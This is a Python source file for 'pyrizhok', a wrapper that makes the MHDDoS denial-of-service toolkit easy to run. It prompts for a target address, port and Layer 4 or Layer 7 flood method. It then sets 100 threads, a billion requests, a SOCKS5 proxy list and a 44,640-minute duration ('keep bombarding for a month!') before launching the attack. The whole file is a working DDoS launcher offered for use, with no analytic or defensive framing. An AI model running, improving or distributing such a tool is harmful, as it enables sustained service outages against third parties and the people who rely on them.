import sys
import time
from sys import argv

import colorama
from humanfriendly.terminal import ansi_wrap

from MHDDoS.start import start, ToolsConsole, Methods
from utils import print_vpn_warning, supports_complex_colors, is_valid_ipv4
import validators


def print_flair():
    BLUE = (0, 91, 187) if supports_complex_colors() else "blue"
    YELLOW = (255, 213, 0) if supports_complex_colors() else "yellow"
    GREEN = (8, 255, 8) if supports_complex_colors() else "green"
    RED = (255, 0, 0) if supports_complex_colors() else "red"

    heart = ansi_wrap("♥", color=RED)
    flair_string = "\n" + \
                   "A light freedom-infused MHDDoS wrapper...\n" + \
                   "\n" + \
                   ansi_wrap("██████╗░██╗░░░██╗██████╗░██╗███████╗██╗░░██╗░█████╗░██╗░░██╗\n", color=BLUE) + \
                   ansi_wrap("██╔══██╗╚██╗░██╔╝██╔══██╗██║╚════██║██║░░██║██╔══██╗██║░██╔╝\n", color=BLUE) + \
                   ansi_wrap("██████╔╝░╚████╔╝░██████╔╝██║░░███╔═╝███████║██║░░██║█████═╝░\n", color=BLUE) + \
                   ansi_wrap("██╔═══╝░░░╚██╔╝░░██╔══██╗██║██╔══╝░░██╔══██║██║░░██║██╔═██╗░\n", color=YELLOW) + \
                   ansi_wrap("██║░░░░░░░░██║░░░██║░░██║██║███████╗██║░░██║╚█████╔╝██║░╚██╗\n", color=YELLOW) + \
                   ansi_wrap("╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝\n", color=YELLOW) + \
                   "\n" + \
                   f"                                 ...from Ukraine with love {heart}\n"
    print(flair_string)
    print(ansi_wrap("Initializing...\n", color=GREEN))


def print_notice(message: str):
    print(ansi_wrap(message, color='blue'))


def print_warning(message: str):
    print(ansi_wrap(message, color='yellow'))


def print_error(message: str):
    print(ansi_wrap(message, color='red'))


def receive_target_address_from_input() -> str:
    print(f"Provide target {ansi_wrap('address', color='green')}:", end=" ")
    address = input()
    return address


def validate_target_address(address: str):
    # validate
    if not address:
        print_error("Target address not specified, aborting execution.")
        sys.exit(1)
    elif validators.ipv4(address):
        # print(f"IPv4 {address}")
        pass
    else:
        address = ToolsConsole.ensure_http_present(address)
        if validators.url(address):
            # print(f"URL {address}")
            pass
        else:
            print_error(f"Target address ('{address}') is not a valid URL nor an IPv4 address. Aborting execution.")
            sys.exit(1)

    return address


def get_default_port_for_address(address: str) -> int:
    # select default port based on the address/protocol
    default_port = 80
    if validators.url(address):
        protocol = address.split("://")[0]
        if protocol == "http":
            default_port = 80
        elif protocol == "https":
            default_port = 443

    return 80


def receive_target_port_from_input(address: str) -> str:
    default_port = get_default_port_for_address(address)
    print(f"Provide target {ansi_wrap('port', color='green')} (skip for default = {default_port}):", end=" ")
    port = input()
    if not port:
        port = default_port
    return port


def validate_target_port(port: str) -> str:
    # check if it is an integer
    try:
        port = int(port)
        if port < 1 or port > 65535:
            raise ValueError
    except ValueError:
        print_error(f"Invalid port provided: {port}. Port must be an integer value in range [1..65535]. Aborting execution.")
        sys.exit(1)

    return str(port)


def receive_attack_method_from_input(default_method: str) -> str:
    print(f"Provide attack {ansi_wrap('method', color='green')} (skip for default = {default_method}):", end=" ")
    method = input()
    if not method:
        method = default_method
    return method


def validate_attack_method(port: str, method: str, default_method: str) -> str:
    if method == default_method:
        return method

    port = int(port)
    is_layer_7_port = port == 80 or port == 443
    if is_layer_7_port and (method in Methods.LAYER7_METHODS):
        print_notice(f"Overriding attack method to '{method}' (Layer 7).")
    elif method in Methods.LAYER4_METHODS:
        print_notice(f"Overriding attack method to '{method}' (Layer 4).")
    elif method in Methods.LAYER7_METHODS:
        print_warning(f"Provided attack method ('{method}') if for Layer 7 attack, but the selected port ({port}) is from Layer 4. Layer 7 attack requires port 80 or 443.\n"
                      f"Will use the default Layer 4 method: '{default_method}'. If you want to execute Layer 7 attack, restart with port 80 or 443.\n")
    else:
        print_warning(f"Invalid attack method provided: '{method}'.\n"
                      f"Will use the default Layer 4 method: '{default_method}'. If you want to override it, restart with one of the valid options:\n"
                      f"    For Layer 4: {', '.join(Methods.LAYER4_METHODS)}\n"
                      f"    For Layer 7: {', '.join(Methods.LAYER7_METHODS)}\n"
                      f"                 (!) NOTE: Layer 7 attack methods only work with ports 80 and 443.")
        method = default_method

    return method


def get_target_ip_address(address: str) -> str:
    if validators.ipv4(address):
        return address

    url_no_protocol = address.split("://")[1]
    dns_info = ToolsConsole.info(url_no_protocol)
    if not dns_info["success"]:
        print_error(f"Port provided, but IP address of '{address}' could not be found. Cannot proceed.")
        sys.exit(1)

    return dns_info['ip']


def kara():
    print_flair()
    print_vpn_warning()

    # Init variables
    address = None
    port = None
    method = None

    # Override script name
    argv[0] = "pyrizhok.py"

    # Parse target address
    if len(argv) < 2:
        address = receive_target_address_from_input()
        # quietly allow to pass other arguments together with the address, space-separated
        all_address_args = address.strip().split(" ")
        if len(all_address_args) > 1:
            print_notice("Multiple arguments passed with the target address. Validating...")
        for i in range(len(all_address_args)):
            argv.insert(i + 1, all_address_args[i])
    if len(argv) > 1:
        address = validate_target_address(argv[1])

    # Parse target port
    if len(argv) < 3:
        port = receive_target_port_from_input(address)
        argv.insert(2, str(port))
    if len(argv) > 2:
        port = validate_target_port(argv[2])

    # Parse attack method
    default_method = "UDP"
    method = default_method
    if len(argv) < 4:
        method = receive_attack_method_from_input(default_method)
        argv.insert(3, method)
    if len(argv) > 3:
        method = validate_attack_method(port, argv[3], default_method)

    # Use IP if attacking layer 4
    if method in Methods.LAYER4_METHODS:
        address = get_target_ip_address(address)

    hardcoded_n_threads = 100
    hardcoded_n_requests = 1000000000

    if method in Methods.LAYER7_METHODS:
        # Prepare URL attack arguments
        argv[1] = method
        argv.insert(2, address)
        argv.insert(3, "5")
        argv.insert(4, f"{hardcoded_n_threads}")
        argv.insert(5, "socks5.txt")
        argv.insert(6, f"{hardcoded_n_requests}")
        argv.insert(7, "44640")  # keep bombarding for a month!

        # Remove excess arguments
        while len(argv) > 8:
            argv.pop(-1)
    else:
        # Prepare IP attack arguments
        argv[1] = method
        argv.insert(2, f"{address}:{port}")
        argv.insert(3, f"{hardcoded_n_threads}")
        argv.insert(4, "44640")  # keep bombarding for a month!

        # Remove excess arguments
        while len(argv) > 5:
            argv.pop(-1)

    # enable debug to see attack progress
    argv.append("true")

    print()
    print(f"Initiating attack with the following MHDDoS parameters:\n     {' '.join(argv[1:])}")
    print()
    time.sleep(1)

    start()


if __name__ == '__main__':
    colorama.init()

    try:
        kara()
    except KeyboardInterrupt:
        print_error("\nExecution aborted.\n")
    except SystemExit as e:
        print(ansi_wrap(f"Caught SystemExit Exception: {e}", color=(255, 0, 0)))

    colorama.deinit()

    input("Execution finished.\nPress ENTER to exit... ")
